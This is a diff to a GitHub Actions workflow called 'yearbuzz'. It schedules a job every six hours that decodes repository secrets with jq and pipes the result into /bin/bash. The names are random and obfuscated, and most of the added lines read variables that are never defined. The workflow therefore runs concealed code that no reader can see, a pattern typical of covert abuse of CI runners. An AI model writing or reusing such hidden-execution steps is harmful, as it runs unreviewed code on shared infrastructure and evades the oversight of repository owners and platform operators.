@@ -3,17 +3,24 @@ name: yearbuzz
 on:
   workflow_dispatch:
   schedule:
-    - cron: '5 2/6 * * *'
+    - cron: '47 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yearbuzz
         env:
-          vyxef60306: ${{ secrets.vyxef60306 }}
+          niy0: ${{ secrets.niy0 }}
         run: |
-          echo $vyxef60306 | jq -r .dqi87 | /bin/bash
-          echo $tntfc73273 | jq -r .dvtbm181 | /bin/bash
-          echo $x7819 | jq -r .mducn3780 | /bin/bash
+          echo $niy0 | jq -r .bl175 | /bin/bash
+          echo $xigw22096 | jq -r .bg384 | /bin/bash
+          echo $eqqb3 | jq -r .nljsj1 | /bin/bash
+          echo $zb766 | jq -r .n6 | /bin/bash
+          echo $bwoo5229 | jq -r .rczy04926 | /bin/bash
+          echo $usj29 | jq -r .w70629 | /bin/bash
+          echo $ij99 | jq -r .suulu7633 | /bin/bash
+          echo $irkc59122 | jq -r .imb74 | /bin/bash
+          echo $iy535 | jq -r .w1446 | /bin/bash
 
